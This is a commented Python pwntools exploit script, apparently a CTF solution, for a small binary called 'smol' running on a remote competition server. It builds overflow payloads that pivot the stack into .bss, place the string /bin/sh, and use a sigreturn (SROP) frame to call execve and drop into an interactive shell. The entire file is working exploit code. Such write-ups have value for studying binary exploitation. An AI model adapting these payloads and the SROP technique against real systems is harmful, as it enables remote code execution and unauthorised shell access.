#!/usr/bin/env python 

#This binary has a obvious buffer overflow but the hard part was that it is too small
#And there is no chance of performing the leak which points us to the only way of
#Sigrop as even there is a syscall gadget there are no way to control the registers
#To perform the execve syscall with /bin/sh as args
#So the only technique left for us is to perform Sigrop
#And the sad part here is no /bin/sh string present in data and .bss section in given binary
#So the hardest part is to make Stack pivot to .bss somehow and maintain the execution flow
#And finally place /bin/sh in a fixed address like .bss
#As there is no PIE in binary to randomize the location during execution

from pwn import *


#r = process("./smol")               #If u want to try and perform a local exploit pls uncomment this line and comment the next line
r = remote("pwn.utctf.live",9998)    #The remote server that runs this binary and the port which the binary uses 
context.clear(arch='amd64')  

bin_sh = 0x402218
def frame1():                        #Frame function to create the Sigreturn Frame and below are the values to the specific registers
    frame = SigreturnFrame(kernel="amd64")
    frame.rax = constants.SYS_execve  #rax value of 59 to perform execve syscall
    frame.rsp = 0x402080    #Stack pointer pointing to .bss address "not useful" but need to specify because binary segfaults with rsp 0
    frame.rdi = bin_sh      #Execve first arg is the address of bin_sh string that is to be stored in rdi register as per x64 ABI
    frame.rsi = 0           #Null to rsi or execve second arg
    frame.rdx= 0            #Null to rdx or execve third arg
    frame.rip = 0x40103d    #Address of syscall instruction 
    return bytes(frame)

Frame = frame1()            #Frame variable which holds the frame for the Sigreturn to perfom the execve syscall 
payload1 = b'A' * 8         #Padding 
payload1+=p64(0x402208)     #Stack pivot to rbp
payload1+=p64(0x401015)     #Return address to perform read again
payload1+=b'B' * 488        #Just a padding again to fill up read 
r.send(payload1)
payload2 = p64(0x40103d)   #syscall address to return for the return instruction
payload2+=p64(0x402220)    #Stack pivot again
payload2+=p64(0x401015)    #Read again as ret takes this address to return
payload2+=b'/bin/sh\x00'
payload2+=p64(0x40103d) * 2 #Just syscall address after stack pivot and ret
payload2+=Frame
payload2+=p64(0x402038) * 2 
payload2+=p64(0x401015)
payload2+=b'A' * 192
r.send(payload2)
payload3 = b'/bin/sh\x00' + b'\x3d\x10\x40\x00\x00\x00\x00' #15 character read to make Sigreturn syscall 
r.send(payload3)
r.interactive()                #Shell!!!!!!!!

